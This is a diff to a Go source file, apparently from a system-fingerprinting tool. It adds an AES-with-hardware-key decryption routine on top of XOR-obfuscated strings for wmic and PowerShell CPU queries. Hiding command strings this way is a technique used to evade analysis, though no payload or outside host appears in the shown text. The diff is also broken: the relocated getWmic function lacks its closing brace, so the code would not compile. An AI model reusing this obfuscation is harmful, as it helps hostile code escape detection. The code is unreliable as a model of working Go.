@@ -359,14 +359,26 @@ func getCountryFallback() string {
 	return string(xor(encCountryFallback, decryptionKey))
 }
 
-func getWmic() string {
-	return string(xor(encWmic, decryptionKey))
+func decryptString(enc []byte) string {
+	key := getHardwareKey()
+	if key == "" {
+		key = string(decryptionKey)
+	}
+	
+	plaintext := aesDecrypt(string(enc), key)
+	if plaintext != "" {
+		return plaintext
+	}
+	
+	return xorDecrypt(enc, decryptionKey)
 }
 
 func getPsGetCpu() string {
 	return string(xor(encPsGetCpu, decryptionKey))
 }
 
+func getWmic() string {
+	return string(xor(encWmic, decryptionKey))
 func getWmicGetCpu() string {
 	return string(xor(encWmicGetCpu, decryptionKey))
 }
